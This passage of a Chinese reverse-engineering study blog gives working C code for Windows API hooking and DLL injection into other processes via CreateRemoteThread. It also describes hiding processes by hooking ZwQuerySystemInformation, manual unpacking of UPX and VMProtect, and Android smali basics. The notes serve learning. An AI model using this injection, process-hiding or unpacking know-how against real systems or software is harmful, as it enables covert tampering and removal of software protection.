第一步：PE加载器读取结构体成员的值，Name成员找到库名称，然后将库文件加载到内存中来。第二步：PE加载器读取OriginalFirstThunk值获得INT地址，然后依次读取INT各项的值，根据函数的标号获取函数的地址第三步：根据FirstThunk的值获取IAT的地址，将上一步获得地址送入IAT中存储。 理解:读取IID(结构体)成员name获取库名-&gt;load(库)-&gt;读取IID的成员，获取INT的地址-&gt;读取函数名并获取地址-&gt;读取IID的成员，获取IAT的地址-&gt;将得到函数地址存入IAT中-&gt;重复直到INT为NULL EATEAT对应的结构体为IMAGE_EXPORT_DESCRIPTOR，位置信息存储在可选头DataDirectory[0]中。一般PE文件此项值应为0，代表不存在这个表项，只有库文件，才会含有这个表项。结构体成员包括特征值，时间戳，版本信息等。重要的成员是Name，存储着库文件的名字；Base存储着函数标号从哪里开始；NumberOfFunctions存储着函数的数量；NumberOfNames存储着函数名称的数量（一般情况下这两项相同）；AddressOfFunctions函数地址数组的首地址；AddressOfNames函数名称地址数组的首地址；AdressOfNameOrdinals，存储着函数标号的地址信息。 个人思考:记得以前学习的时候，把VA与VirtualAddress看成一个相同的，导致转化的时候很矛盾，现在再看，真是自己可以静心好好的学，再次理解IAT的运行机制。 参考：https://www.jianshu.com/p/af9766222816https://www.cnblogs.com/aguoshaofang/p/5021759.html]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RE——Hook]]></title>
    <url>%2F2018%2F03%2F15%2Fre_hook%2F</url>
    <content type="text"><![CDATA[逆向分析之”花”。windows的Hook是程序设计中最为灵活多变的技巧之一。Hook有两种含义:1、系统提供的消息Hook机制;2、自定义的Hook编程技巧，Hook（钩子）是WINDOWS提供的一种消息处理机制平台，是指在程序正常运行中接受信息之前预先启动的函数，用来检查和修改传给该程序的信息，（钩子）实际上是一个处理消息的程序段，通过系统调用，把它挂入系统。每当特定的消息发出，在没有到达目的窗口前，钩子程序就先捕获该消息，亦即钩子函数先得到控制权。 钩取方式如图，一般有三种API钩取方式：下面都以Notepad.exe的WriteFile() API为例钩取 方式1——动态-进程内存直接在API加载时调用钩取动态-进程内存-代码-调试技术123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#include "windows.h"#include "stdio.h"LPVOID g_pfWriteFile = NULL; //writefile函数的地址CREATE_PROCESS_DEBUG_INFO g_cpdi; //存放调试信息BYTE g_chINT3 = 0xCC, g_chOrgByte = 0; //0xCC是int 3的机器码//当创建进程调试事件时运行此BOOL OnCreateProcessDebugEvent(LPDEBUG_EVENT pde)&#123; // WriteFile() API Address 获取地址 g_pfWriteFile = GetProcAddress(GetModuleHandleA("kernel32.dll"), "WriteFile"); // API Hook - WriteFile() //不知道？？？ memcpy(&amp;g_cpdi, &amp;pde-&gt;u.CreateProcessInfo, sizeof(CREATE_PROCESS_DEBUG_INFO)); //这里读出 WriteFile()的首地址并备份在g_chOrgByte，后面脱钩会用到 ReadProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chOrgByte, sizeof(BYTE), NULL); //将0xCC(INT 3) 写入WriteFile() API Address的第一个字节 WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chINT3, sizeof(BYTE), NULL); return TRUE;&#125;//当异常发生时，也就是 WriteFile()函数执行结束BOOL OnExceptionDebugEvent(LPDEBUG_EVENT pde)&#123; CONTEXT ctx; //记录hook的上下文 PBYTE lpBuffer = NULL; //用于临时缓冲区 DWORD dwNumOfBytesToWrite, dwAddrOfBuffer, i; PEXCEPTION_RECORD per = &amp;pde-&gt;u.Exception.ExceptionRecord; // BreakPoint exception (INT 3) 当断点是3时，这样就一定会先执行OnCreateProcessDebugEvent if (EXCEPTION_BREAKPOINT == per-&gt;ExceptionCode) &#123; // BP Address == WriteFile() Address if (g_pfWriteFile == per-&gt;ExceptionAddress) &#123; // #1. Unhook 恢复 WriteFile()的首地址的值，也就是改为刚才备份g_chOrgByte WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chOrgByte, sizeof(BYTE), NULL); // #2. Thread Context 获取线程的上下文 ctx.ContextFlags = CONTEXT_CONTROL; GetThreadContext(g_cpdi.hThread, &amp;ctx); // #3. WriteFile() 函数参数param 2, 3 的值 // param 2 : ESP + 0x8 (这里是32位) // param 3 : ESP + 0xC ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0x8),&amp;dwAddrOfBuffer, sizeof(DWORD), NULL); ReadProcessMemory(g_cpdi.hProcess, (LPVOID)(ctx.Esp + 0xC),&amp;dwNumOfBytesToWrite, sizeof(DWORD), NULL); // #4. 分配临时缓冲区 lpBuffer = (PBYTE)malloc(dwNumOfBytesToWrite + 1); memset(lpBuffer, 0, dwNumOfBytesToWrite + 1); // #5. WriteFile() 的输入 复制 缓冲区 ReadProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer,lpBuffer, dwNumOfBytesToWrite, NULL); printf("\n### original string ###\n%s\n", lpBuffer); // #6. 将小写转换成大写 for (i = 0; i &lt; dwNumOfBytesToWrite; i++) &#123; if (0x61 &lt;= lpBuffer[i] &amp;&amp; lpBuffer[i] &lt;= 0x7A) lpBuffer[i] -= 0x20; &#125; printf("\n### converted string ###\n%s\n", lpBuffer); // #7. 将变换后缓冲区 的数据写入WriteFile()函数的缓冲区 WriteProcessMemory(g_cpdi.hProcess, (LPVOID)dwAddrOfBuffer,lpBuffer, dwNumOfBytesToWrite, NULL); // #8. 释放缓冲区 free(lpBuffer); // #9. 将上下文的EIP更改为 WriteFile()的首地址 ctx.Eip = (DWORD)g_pfWriteFile; SetThreadContext(g_cpdi.hThread, &amp;ctx); // #10. 运行被调试的进程 ContinueDebugEvent(pde-&gt;dwProcessId, pde-&gt;dwThreadId, DBG_CONTINUE); //释放当前的时间片，即放弃当前线程执行的CPU的时间片 Sleep(0); // #11. API Hook WriteProcessMemory(g_cpdi.hProcess, g_pfWriteFile,&amp;g_chINT3, sizeof(BYTE), NULL); return TRUE; &#125; &#125; return FALSE;&#125;void DebugLoop()&#123; DEBUG_EVENT de; DWORD dwContinueStatus; // Waiting Debuggee event 等待调试事件的发生 ，循环调试 while (WaitForDebugEvent(&amp;de, INFINITE)) &#123; dwContinueStatus = DBG_CONTINUE; // Debuggee attach 属于SEH异常一种 if (CREATE_PROCESS_DEBUG_EVENT == de.dwDebugEventCode) &#123; OnCreateProcessDebugEvent(&amp;de); //跳到下一个函数 &#125; // 异常事件 属于SEH异常一种 else if (EXCEPTION_DEBUG_EVENT == de.dwDebugEventCode) &#123; //跳到下一个函数 if (OnExceptionDebugEvent(&amp;de)) continue; &#125; // Debuggee exit,被调试事件终止 属于SEH异常一种 else if (EXIT_PROCESS_DEBUG_EVENT == de.dwDebugEventCode) &#123; break; &#125; // Debuggee continue.再次调试事件 ContinueDebugEvent(de.dwProcessId, de.dwThreadId, dwContinueStatus); &#125;&#125;int main(int argc, char* argv[])&#123; DWORD dwPID; if (argc != 2) &#123; printf("\nUSAGE : hook.exe &lt;pid&gt;\n"); return 1; &#125; // Attach Process 开始调试 dwPID = atoi(argv[1]); if (!DebugActiveProcess(dwPID)) &#123; printf("DebugActiveProcess(%d) failed!!!\n" "Error Code = %d\n", dwPID, GetLastError()); return 1; &#125; //循环调试 DebugLoop(); //跳到下一个函数 return 0;&#125; 若在生成exe文件是出现这个错误“GetModuleHandleW”: 不能将参数 1 从“const char [10]”转换为“LPCWSTR” 解决方法:项目菜单-&gt;属性-&gt;配置属性-&gt;常规-&gt;项目默认值-&gt;字符集改为未设置 生成hook.exe 额，在调试的时候，运行hook.exe pid后发现nopad卡住啦，尴尬,怀疑可能是要在32位的系统下，然后又在32位的系统下运行，发现并不是系统问题。又怀疑是不是编译的时候开啦ALSR啦，关掉ALSR，还是不行，得看看代码啦。原来是代码错啦，这。。。。 运行结果:总结: 这是代码动态注入，通过附件进程，触发异常，通过异常获取WriteFile()函数的信息，在WriteFile()函数首地址下断点，然后截取控制流程，再次触发异常，恢复WriteFile()函数首地址，并且获取线程的上下文，然后将WriteFile()函数读取的缓冲区读出，然后转换成目标数据后写入WriteFile()函数的缓冲区，恢复线程上下文，继续运行就可以hook成功啦。 方式2——IAT钩取IAT的hook原理:在保持运行代码不变的前提下，将IAT中保存的API起始地址变为用户的起始地址。如图:钩取前钩取后 下面以计算器为例，讲解IAT的dll的hook.hookiat.dll的hookiat.cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293#include "stdio.h"#include "wchar.h"#include "windows.h"typedef BOOL (WINAPI *PFSETWINDOWTEXTW)(HWND hWnd, LPWSTR lpString);FARPROC g_pOrgFunc = NULL;BOOL WINAPI MySetWindowTextW(HWND hWnd, LPWSTR lpString)&#123; wchar_t* pNum = L"零一二三四五六七八九"; wchar_t temp[2] = &#123;0,&#125;; int i = 0, nLen = 0, nIndex = 0; nLen = wcslen(lpString); for(i = 0; i &lt; nLen; i++) &#123; // 将阿拉伯数字转化成中文 // lpString缓冲区 中文的字宽是的2字节 if( L'0' &lt;= lpString[i] &amp;&amp; lpString[i] &lt;= L'9' ) &#123; temp[0] = lpString[i]; nIndex = _wtoi(temp); lpString[i] = pNum[nIndex]; &#125; &#125; // 调用user32!SetWindowTextW() API // 修改lpString缓冲区的数据 return ((PFSETWINDOWTEXTW)g_pOrgFunc)(hWnd, lpString);&#125;// hook_iatBOOL hook_iat(LPCSTR szDllName, PROC pfnOrg, PROC pfnNew)&#123; HMODULE hMod; //hMod=ImageBase 基址 LPCSTR szLibName; PIMAGE_IMPORT_DESCRIPTOR pImportDesc; PIMAGE_THUNK_DATA pThunk; DWORD dwOldProtect, dwRVA; PBYTE pAddr; hMod = GetModuleHandle(NULL); //hMod= ImageBase of calc.exe 基址 pAddr = (PBYTE)hMod; pAddr += *((DWORD*)&amp;pAddr[0x3C]); // pAddr = VA to PE signature (IMAGE_NT_HEADERS) dwRVA = *((DWORD*)&amp;pAddr[0x80]); // dwRVA = RVA to IMAGE_IMPORT_DESCRIPTOR Table pImportDesc = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)hMod+dwRVA); // pImportDesc = VA to IMAGE_IMPORT_DESCRIPTOR Table //上面几行代码首先从ImageBase开始，经由PE签名找到IDT,plmportDesc中存储着IID(IMAGE_IMPORT_DESCRIPTOR)结构体的起始地址,IDT是由IID组成的数组，要找的IAT，先要查找到这个位置，而在本例中，pImportDesc=0x1012B80，可以用PEview看见。但是这里为什么是80？？？ ，而我们要找user32.dll,它在下面，所以遍历查找 for( ; pImportDesc-&gt;Name; pImportDesc++ ) &#123; szLibName = (LPCSTR)((DWORD)hMod + pImportDesc-&gt;Name); //获取user32.dll的库名 if( !_stricmp(szLibName, szDllName) ) // 查找要的user32.dll &#123; //得到user32.dll库的IAT地址 ，接着在IAT查找需要的函数user32!SetWindowTextW() pThunk = (PIMAGE_THUNK_DATA)((DWORD)hMod + pImportDesc-&gt;FirstThunk); for( ; pThunk-&gt;u1.Function; pThunk++ ) &#123; if( pThunk-&gt;u1.Function == (DWORD)pfnOrg ) //如果找到user32!SetWindowTextW() &#123; VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, 4, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect); pThunk-&gt;u1.Function = (DWORD)pfnNew; VirtualProtect((LPVOID)&amp;pThunk-&gt;u1.Function, 4, dwOldProtect, &amp;dwOldProtect); return TRUE; &#125; &#125; &#125; &#125; return FALSE;&#125;//dll主函数BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)&#123; switch( fdwReason ) &#123; case DLL_PROCESS_ATTACH : //保存API原地址 g_pOrgFunc = GetProcAddress(GetModuleHandle(L"user32.dll"), "SetWindowTextW"); // # hook 钩取 // hookiat!MySetWindowText()钩取user32!SetWindowTextW() hook_iat("user32.dll", g_pOrgFunc, (PROC)MySetWindowTextW); break; case DLL_PROCESS_DETACH : // # unhook 脱钩 // calc.exe 的IAT 恢复 hook_iat("user32.dll", (PROC)MySetWindowTextW, g_pOrgFunc); break; &#125; return TRUE;&#125; 我们再看看hookd.exe的cpp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#include "stdio.h"#include "windows.h"#include "tlhelp32.h"#include "winbase.h"#include "tchar.h"//使用方式void usage()&#123; printf("\nInjectDll.exe by ReverseCore\n" "- blog : http://www.reversecore.com\n" "- email : reversecore@gmail.com\n\n" "- USAGE : hookdiat.exe &lt;i|e&gt; &lt;PID&gt; &lt;dll_path&gt;\n\n");&#125;//钩取hookBOOL InjectDll(DWORD dwPID, LPCTSTR szDllName)&#123; HANDLE hProcess, hThread; LPVOID pRemoteBuf; DWORD dwBufSize = (DWORD)(_tcslen(szDllName) + 1) * sizeof(TCHAR); LPTHREAD_START_ROUTINE pThreadProc; if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123; DWORD dwErr = GetLastError(); return FALSE; &#125; pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllName, dwBufSize, NULL); pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW"); hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); return TRUE;&#125;//脱钩BOOL EjectDll(DWORD dwPID, LPCTSTR szDllName)&#123; BOOL bMore = FALSE, bFound = FALSE; HANDLE hSnapshot, hProcess, hThread; MODULEENTRY32 me = &#123; sizeof(me) &#125;; LPTHREAD_START_ROUTINE pThreadProc; if (INVALID_HANDLE_VALUE == (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID))) return FALSE; bMore = Module32First(hSnapshot, &amp;me); for (; bMore; bMore = Module32Next(hSnapshot, &amp;me)) &#123; if (!_tcsicmp(me.szModule, szDllName) || !_tcsicmp(me.szExePath, szDllName)) &#123; bFound = TRUE; break; &#125; &#125; if (!bFound) &#123; CloseHandle(hSnapshot); return FALSE; &#125; if (!(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))) &#123; CloseHandle(hSnapshot); return FALSE; &#125; pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "FreeLibrary"); hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, me.modBaseAddr, 0, NULL); WaitForSingleObject(hThread, INFINITE); CloseHandle(hThread); CloseHandle(hProcess); CloseHandle(hSnapshot); return TRUE;&#125;DWORD _EnableNTPrivilege(LPCTSTR szPrivilege, DWORD dwState)&#123; DWORD dwRtn = 0; HANDLE hToken; if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken)) &#123; LUID luid; if (LookupPrivilegeValue(NULL, szPrivilege, &amp;luid)) &#123; BYTE t1[sizeof(TOKEN_PRIVILEGES) + sizeof(LUID_AND_ATTRIBUTES)]; BYTE t2[sizeof(TOKEN_PRIVILEGES) + sizeof(LUID_AND_ATTRIBUTES)]; DWORD cbTP = sizeof(TOKEN_PRIVILEGES) + sizeof(LUID_AND_ATTRIBUTES); PTOKEN_PRIVILEGES pTP = (PTOKEN_PRIVILEGES)t1; PTOKEN_PRIVILEGES pPrevTP = (PTOKEN_PRIVILEGES)t2; pTP-&gt;PrivilegeCount = 1; pTP-&gt;Privileges[0].Luid = luid; pTP-&gt;Privileges[0].Attributes = dwState; if (AdjustTokenPrivileges(hToken, FALSE, pTP, cbTP, pPrevTP, &amp;cbTP)) dwRtn = pPrevTP-&gt;Privileges[0].Attributes; &#125; CloseHandle(hToken); &#125; return dwRtn;&#125;//主函数int _tmain(int argc, TCHAR* argv[])&#123; if (argc != 4) //参数是不是4个 &#123; usage(); return 1; &#125; // adjust privilege _EnableNTPrivilege(SE_DEBUG_NAME, SE_PRIVILEGE_ENABLED); if (!_tcsicmp(argv[1], L"i")) //判断是钩取 InjectDll((DWORD)_tstoi(argv[2]), argv[3]); else if (!_tcsicmp(argv[1], L"e")) //判断是脱钩 EjectDll((DWORD)_tstoi(argv[2]), argv[3]); return 0;&#125; 运行结果:钩取脱钩 个人总结:通过PE文件的结构，先获取线程基址，从ImageBase开始，经由PE签名找到IDT：ImageBase-&gt;IDT-&gt;IAT(dll)-&gt;函数 方式3——进程隐藏进程隐藏就是将要隐藏的进程藏在其他的进程中，实现进程隐藏的关键不是进程本身，而是其他进程。其中用户模式下最常用的是ntdll.ZwQuerySystemInformation() API钩取技术。 假如我们要隐藏test.exe进程，那么就要钩取ProcExp.exe(进程查看器或taskmgr.exe任务管理器)的ntdll.ZwQuerySystemInformation() API， 2个问题1、钩取的进程数如果进程查看器和任务管理器多开几个，那么进程钩取一个，那是不可以的，所以要钩取系统中运行的所有进程。2、新创进程如果当钩取了系统中运行的所有进程，这时又新建一个ProcExp.exe，而这个进程又没有被钩取。 解决对于上面2个问题，我们隐藏test.exe进程时需要钩取系统中运行的所有进程的ntdll.ZwQuerySystemInformation() API，并且对后面将要启动的所有进程也进行相同的操作(当然这是全自动的啦)，这叫全局钩取。 来源逆向工程核心原理 最后，文学还是很重要的，借助诗圣两句提高文学素养绝代有佳人，幽居在空谷。但见新人笑，那闻旧人哭。——佳人]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[RE_常见的脱壳方法]]></title>
    <url>%2F2018%2F03%2F15%2Fre_tou_ke%2F</url>
    <content type="text"><![CDATA[软件壳出于程序作者想对程序资源压缩、注册保护的目的，把壳分为压缩壳和加密壳(强壳)两种，压缩壳只是为了减小程序体积对资源进行压缩，加密壳是程序输入表等等进行加密保护。 壳的工作原理某些加壳程序加壳后会修改了原来导入目录表的位置为壳的导入表，这样默认的导入表指向壳部分的导入表，你就看不到原来的导入表的内容了。程序启动后，操作系统为壳的导入表加载，在壳代码运行完成之后，壳代码会跳到原程序的入口点OEP，壳模拟操作系统填充原来导入表IAT，这样保证代码段能正常调用函数。一般壳的工作原理也就是这样了，随着现在加壳加密技术的进步，不是所有加壳软件都会这样。 脱壳原理首先修改被加壳程序的入口点到程序原来的OEP，然后修改PE程序导入表目录地址为原来导入表地址，或者新建一个节，将这个新节作为导入表节，并将原导入表内容写入新节导入表。 普通壳脱壳例如：先用peid查一下壳，发现有壳(这里是upx壳)[查壳工具主要以peid和fileinfo这两个软件为代表]接下里分别用下面5种方法脱壳 1、单步跟踪法一般先f8单步步过，遇见向上的f4跳到下一条语句,然后会发现，一般有很大的跳转（大跨段），比如jmp XXXXXX 或者JE XXXXXX或者有RETN的一般很快就会到程序的OEP 2、ESP定律法原理:利用堆栈平衡OD加载，会看见pushad,运行一步，下硬件断点运行,就会在硬件断点的位置啦，删除硬件断点，接着往下执行几步就可以看见OEP啦 3、两次内存镜像法如图:点击运行，到达这里接着点击运行 4、一步到达OEP(对少数壳有用)OD加载后，Ctrl+F，搜索popad,接着f4运行到这里，接着一步步往下找就可以找到OEP啦。 5、模拟跟踪法上面都可以属于模拟跟踪法。 6、SFX重载后，自动跳到程序入口点 7、修复IAT先找到OEP,先用loadPE脱下壳，然后用ImportREC修复IAT,操作如下:loadPE先dump下文件PEID查ImportREC修复IAT(这里我是手动OEP修改的,有些直接自己获取OEP)接着转储文件选择刚才dump下来的文件，点击运行 vmprotect脱壳这里有vc的程序作为示例:正常的vc的程序的入口是的机器码是: 55 8b ec而vmp的壳的程序，是找不到55 8b ec,这里学习记录一下脱壳方法1、用exeinfo PE查壳2、设置OD：选项-&gt;调试设置-&gt;事件-&gt;系统断点3、将程序载入od,f9运行，便会来到一个call，(ctrl+g)搜索，VirtualProtect:4、接着便会来到一个地址，在这里下断点，继续f9,5、然后运行几次f9都会断到这里，NewProtect = READONLY且最后一次时(运行几次就知道啦，低位不会变)，此时alt+B，断点界面取消或禁用断点，然后alt+M，对text段下内存访问断点：6、来到这里7、(ctrl+g)搜索401000，硬件访问断点。运行，接着可以搜索特征码:EB0B85F375078BC6C1E0100BF08、这时就会找到OEP啦，可以直接dump出来，IDA可以看见算法啦，如果要运行，还需要IAT修复这里分享一下vmp脱壳教程链接: http://pan.baidu.com/s/1qWt14lA 密码: 2wmq 解压密码：www.lthack.com 文学修养衣带渐宽终不悔，为伊消得人憔悴。]]></content>
      <categories>
        <category>re</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Android_之_DDMS_与_修改smali混用]]></title>
    <url>%2F2018%2F03%2F12%2Fandroid_re_3_ddms%2F</url>
    <content type="text"><![CDATA[学习了这么久，实践才是检测真理的唯一真理呀(今天看见两个国外贼漂亮的小姐姐) DDMS与修改smali混用1、题目链接：https://pan.baidu.com/s/1YOXnJYyv2QWfWnP7Jwd2JQ 密码：fsvl用工具android killer打开apk,先在编译成apk,发现程序能正常运行，并没有apk验证,那么可以改smali代码啦，也许不需要。接下来看simple.check()函数啦，然后你就会发现，这些人怎么有耐心写这么长的代码(头大)。经过分析可以发现类中成员变量A[]就是存储用户输入的字符串，B[]就是存储flag的可以直接使用“smali 代码注入”，插入LOG，直接打印出计算后的值1、构造打印函数2、插入打印位置接着就是反编译成apk,然后用模拟器打开，接着ddms动态3、ddms动态调试 Androidjni编程1、什么是JNIJNI(Java Native Interface):java本地开发接口JNI是一个协议，这个协议用来沟通java代码和外部的本地代码(c/c++)外部的c/c++代码也可以调用java代码。效率上 C/C++是本地语言，比java更高效代码移植，如果之前用C语言开发过模块，可以复用已经存在的c代码java反编译比C语言容易，一般加密算法都是用C语言编写，不容易被反编译 2、交叉编译交叉编译即在一个平台，编译出另一个平台能够执行的二进制代码。原理:即在一个平台上，模拟其他平台的特性。 1、常见的交叉编译工具NDK(Native Development Kit): 开发JNI必备工具，就是模拟其他平台特性类编译代码的工具CDT(C/C++ Development Tools): 是Eclipse开发C语言的一个插件，高亮显示C语言的语法Cygwin: 一个Windows平台的Unix模拟器 2、NDK的目录结构build/tools：linux的批处理文件platforms：编译c代码需要使用的头文件和类库prebuilt：预编译使用的二进制可执行文件sample：jni的使用例子source：ndk的源码toolchains：工具链ndk-build.cmd:编译打包c代码的一个指令，需要配置系统环境变量 3、Android_Studio之NDK安装搭建ndk环境1、路径： File-&gt;Setting-&gt;看图(这个要等待一段时间)2、新建项目然后一直默认下一步，接着自动生成一个demo。运行结果:将apk改成zip发现.so文件 师傅的智慧是无线的，羡慕羡慕。参考:https://www.ichunqiu.com/writeup/detail/35]]></content>
      <categories>
        <category>android</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[Android与Apk的文件结构]]></title>
    <url>%2F2018%2F03%2F11%2Fandroid_construction%2F</url>
    <content type="text"><![CDATA[Android与Apk的文件结构在学习逆向很重要的一步。随便记录一下smali语法 1、AndroidAndroid 是google公司针对手机开发的一个平台，并公布了其中大部分代码，其大部分应用程序都是用JAVA开发的。 系统结构android的系统架构和其操作系统一样，采用了分层的架构。从架构图看，android分为四个层，从高层到低层分别是应用程序层、应用程序框架层、系统运行库层和linux核心层。从而看出liunx是很重要的，蓝色的代表java程序，黄色的代码为运行JAVA程序而实现的虚拟机，绿色部分为C/C++语言编写的程序库，红色的代码内核(linux内核+drvier)。 1、应用程序Android会同一系列核心应用程序包一起发布，应用程序基本都是使用JAVA语言编写的。 2、应用程序框架开发人员也可以完全访问核心应用程序所使用的API 框架，该应用程序的架构设计简化了组件的重用。 3、系统运行库(1)、程序库Android 包含一些C/C++库，这些库能被Android系统中不同的组件使用。它们通过 Android 应用程序框架为开发者提供服务。其实Android并非讲所有的设备驱动都放在linux内核里面，而是实现在userspace空间，这么做的主要原因是GPL协议，Linux是遵循该 协议来发布的，也就意味着对 linux内核的任何修改，都必须发布其源代码。而现在这么做就可以避开而无需发布其源代码，毕竟它是用来赚钱的。(2)Android 运行库Android 包括了一个核心库，该核心库提供了JAVA编程语言核心库的大多数功能。每一个Android应用程序都在它自己的进程中运 行，都拥有一个独立的Dalvik虚拟 机实例。Dalvik被设计成一个设备可以同时高效地运行多个虚拟系统。 Dalvik虚拟机执行（.dex）的Dalvik可执行文件，该格式文件针对小内存使用做了优化。同时Dalvik虚拟机依赖于linux内核的一些功能，比如线程机制和底层内存管理机制。 4、Linux内核Android 的核心系统服务依赖于 Linux 2.6 内核，如安全性，内存管理，进程管理， 网络协议栈和驱动模型。 Linux 内核也同时作为硬件和软件栈之间的抽象层。 2、Apk的文件结构APK就是一个zip压缩包，解开这个APK包我们可以看到以下的结构：123456META-INF：签名文件res：资源文件AndroidManifest.xml：android 配置文件classes.dex：java代码编译后产生的类似字节码的文件（dalvik 字节码）resources.arsc：配置文件其他文件：诸如assets等，或者lib（native so 代码）等目录 apk的核心逻辑主要在 classes.dex(代码主要存在的文件)，有些代码会在.so(动态链接库)文件 [最头痛的文件]. 3、Smali语法1、函数函数的定义一般为：Func-Name (Para-Type1Para-Type2Para-Type3…)Return-Type注意参数与参数之间没有任何分隔符1、check ()V —-&gt; void check()2、check (III)Z —-&gt; boolean check(int,int,int)3、check (Z[I[Ijava/lang/String)java/lang/String; —-&gt; String check(boolean,int[],int[],String) 而函数又分为direct method和virtual method。direct method就是private函数，其余的public和protected函数都属于virtual method。 函数调用格式：.method + 访问修饰符 + 方法名(参数表) + 返回值类型.method // 方法的开始.end method // 方法结束 在调用函数时，有invoke-direct，invoke-virtual，另外还有invoke-static、invoke-super以及invoke-interface等几种不同的指令。对象 -&gt; 方法名(参数类型)返回值invoke-virtual 非静态方法调用invoke-static 静态方法调用invoke-direct 构造方法调用？invoke-super 调用父类方法invoke-interface 调用接口（1）、invoke-static：顾名思义就是调用static函数的，因为是static函数，所以比起其他调用少一个参数，例如：12const-string v0, "fmodex" invoke-static &#123;v0&#125;, Ljava/lang/System;-&gt;loadLibrary(Ljava/lang/String;)V 这个是调用static void System.loadLibrary(String)来加载NDK编译的so库用的方法，同样也是这里v0就是参数”fmodex”了。（2）、invoke-virtual：用于调用protected或public函数12sget-object v0, Lcom/disney/WMW/WMWActivity;-&gt;shareHandler:Landroid/os/Handler;invoke-virtual &#123;v0, v3&#125;, Landroid/os/Handler;-&gt;removeCallbacksAndMessages(Ljava/lang/Object;)V v0是shareHandler:Landroid/os/Handler，v3是传递给removeCallbackAndMessage方法的Ljava/lang/Object参数 调用返回结果:用到move-result（返回基本数据类型）和move-result-object（返回对象）指令 smali中函数实体分析12345678910.method protected onDestroy()V .locals 0 .prologue .line 277 invoke-super &#123;p0&#125;, Lcom/disney/common/BaseActivity;-&gt;onDestroy()V .line 279 return-void .end method .local 0，这句话很重要，标明了你在这个函数中最少要用到的本地寄存器的个数。在这里，由于只需要调用一个父类的onDestroy()处理，所以只需要用到p0，所以使用到的本地寄存器数为0。如果不清楚这个规则，很容易在植入代码后忘记修改.local 的值，那么回编译后运行时将会得到一个VerifyError错误，而且极难发现问题所在。 2、语法if与switch判断语句if判断一共有12条指令：12345678910111213if-eq vA, VB, cond_** 如果vA等于vB则跳转到cond_**。相当于if (vA==vB)if-ne vA, VB, cond_** 如果vA不等于vB则跳转到cond_**。相当于if (vA!=vB)if-lt vA, VB, cond_** 如果vA小于vB则跳转到cond_**。相当于if (vA&lt;vB)if-le vA, VB, cond_** 如果vA小于等于vB则跳转到cond_**。相当于if (vA&lt;=vB)if-gt vA, VB, cond_** 如果vA大于vB则跳转到cond_**。相当于if (vA&gt;vB)if-ge vA, VB, cond_** 如果vA大于等于vB则跳转到cond_**。相当于if (vA&gt;=vB)if-eqz vA, :cond_** 如果vA等于0则跳转到:cond_** 相当于if (VA==0)if-nez vA, :cond_** 如果vA不等于0则跳转到:cond_**相当于if (VA!=0)if-ltz vA, :cond_** 如果vA小于0则跳转到:cond_**相当于if (VA&lt;0)if-lez vA, :cond_** 如果vA小于等于0则跳转到:cond_**相当于if (VA&lt;=0)if-gtz vA, :cond_** 如果vA大于0则跳转到:cond_**相当于if (VA&gt;0)if-gez vA, :cond_** 如果vA大于等于0则跳转到:cond_**相当于if (VA&gt;=0) Switch语句12345678910111213141516171819202122232425整形顺序结构switch(int) :pswitch_data_0 .packed-switch 0x0 :pswitch_0 :pswitch_1.end packed-switch整形非顺序结构switch(int) :sswitch_data_0 .sparse-switch 0x0 -&gt; :sswitch_0 0x1 -&gt; :sswitch_1 0xa -&gt; :sswitch_2.end sparse-switchswitch(String) :pswitch_data_0 .packed-switch 0x41 :pswitch_0 :pswitch_1 .end packed-switch :pswitch_data_1 .packed-switch 0x0 :pswitch_2 :pswitch_3 .end packed-switch 循环语句123456789101112131415161718192021222324252627282930.method public statementFor()Z .locals 4 .prologue .line 17 const/4 v0, 0x0 .local v0, "a":I :goto_0 const/16 v1, 0x64 if-ge v0, v1, :cond_0 // 结束循环条件 .line 18 const-string v1, "StateLoop" new-instance v2, Ljava/lang/StringBuilder; invoke-direct &#123;v2&#125;, Ljava/lang/StringBuilder;-&gt;&lt;init&gt;()V const-string v3, "" invoke-virtual &#123;v2, v3&#125;, Ljava/lang/StringBuilder;-&gt;append(Ljava/lang/String;)Ljava/lang/StringBuilder; move-result-object v2 invoke-virtual &#123;v2, v0&#125;, Ljava/lang/StringBuilder;-&gt;append(I)Ljava/lang/StringBuilder; move-result-object v2 invoke-virtual &#123;v2&#125;, 